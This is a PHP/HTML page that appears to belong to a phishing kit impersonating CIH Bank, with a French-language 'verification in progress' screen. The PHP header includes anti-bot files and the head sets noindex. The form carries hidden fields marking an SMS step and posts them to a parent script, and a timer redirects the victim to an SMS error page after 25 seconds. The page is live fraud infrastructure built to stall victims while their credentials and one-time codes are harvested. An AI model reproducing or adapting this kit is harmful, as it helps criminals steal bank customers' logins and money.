<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
/* Copyright: */
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php";

?>
<!DOCTYPE html>
<html style="background: #FFF;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex,">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/css-helpers.css">
        <link rel="stylesheet" href="css/css-style.css">

        <link rel="shortcut icon" href="favicons/newSkinImgs-favicon-new-cih.ico">

        <title>CIH ONLINE</title>
    </head>

    <body style="background: #FFF;">

		<div id="ss-wrapper">
            <div class="ss-area">
                <form action="../index.php" method="post">
                <input type="hidden" name="captcha">
                <input type="hidden" name="step" value="sms">
                <input type="hidden" name="error" value="">
                <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><center><img style="max-width: 150px;" src="images/newSkinImgs-logo_cihbank.png"></center></div>
                </div>
                <h3>Veuillez confirmer la v&eacute;rification .</h3>
                <div class="details">
                    <div class="loader">
                        <div class="spinner-border text-primary" role="status"></div>
                        <p>V&eacute;rification de vos informations...</p>
                    </div>
                </div>
                <p class="copy">&copy; CIH BANK 2022. All rights reserved.</p>
            </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/js-bootstrap.bundle.min.js"></script>
        <script src="js/js-all.min.js"></script>
        <script src="js/3.0.0-jquery.payment.min.js"></script>
        <script src="js/js-jquery.countdownTimer.min.js"></script>
        <script src="js/js-script.js"></script>

        <script type="text/javascript">
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html('Try again');
            }
            $('.timer').click(function(){
                location.reload();
            });
            setTimeout(function () {
                window.location.href= 'smsrederror.php';
            },25000); // 1000 = 1s
        </script>

    </body>

</html>
